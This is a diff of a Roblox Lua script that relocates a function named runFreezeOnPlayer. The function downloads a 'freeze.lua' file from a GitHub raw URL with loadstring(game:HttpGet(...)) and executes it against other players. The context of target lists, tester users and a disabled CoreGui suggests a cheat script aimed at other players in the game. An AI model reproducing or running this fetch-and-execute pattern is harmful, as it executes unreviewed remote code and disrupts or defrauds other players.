@@ -15,13 +15,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
--- Load and run the freeze script on target players
-local function runFreezeOnPlayer(player)
-    if not player or player == LocalPlayer then return end
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/freeze.lua"))()(player)
-    end)
-end
+
 -- ==================== CONFIG ====================
 local tester_users = {
     "SMILEY_RIVALS",
@@ -42,6 +36,14 @@ end)
 local processed = {}
 local guiCreated = false
 local coreGuiDisabled = false -- Track if CoreGui has been disabled
+
+-- Load and run the freeze script on target players
+local function runFreezeOnPlayer(player)
+    if not player or player == LocalPlayer then return end
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/freeze.lua"))()(player)
+    end)
+end
 
 -- Get all target names (deduped)
 local function getAllTargets()
